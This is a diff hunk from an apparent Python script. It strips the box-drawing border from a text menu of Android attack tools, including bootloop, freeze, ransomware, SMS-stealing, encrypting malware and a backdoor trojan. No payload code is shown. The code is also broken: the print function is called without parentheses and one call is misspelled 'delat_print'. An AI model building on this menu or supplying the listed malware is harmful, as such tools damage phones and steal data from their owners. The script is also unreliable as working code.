@@ -18,17 +18,15 @@ def delay_print(s):
         sys.stdout.flush()
         time.sleep(0.05)
 delay_print 
-delay_print "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜"
-delay_print "▌01. Android Bootlop       ▐"
-delay_print "▌02. Android Freeze        ▐"
-delay_print "▌03. Android Rans        ▐"
-delay_print "▌04. Android Malware       ▐"
-delay_print "▌05. Android Decryptor        ▐"
-delay_print "▌06. Android Decryptor 2        ▐"
-delay_print "▌07. Android SMS Tief        ▐"
-delay_print "▌08. Android Dangerous Malware    ▐"
-delay_print "▌09. Android ENC Malware       ▐"
-delat_print "▌10. Android Door Trojan     ▐"
-delay_print "▌exit     ▐"
-delay_print "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟"
+delay_print "01. Android Bootlop"
+delay_print "02. Android Freeze"
+delay_print "03. Android Rans"
+delay_print "04. Android Malware"
+delay_print "05. Android Decryptor"
+delay_print "06. Android Decryptor 2"
+delay_print "07. Android SMS Tief"
+delay_print "08. Android Dangerous Malware"
+delay_print "09. Android ENC Malware"
+delat_print "10. Android Door Trojan"
+delay_print "exit"
 delay_print 
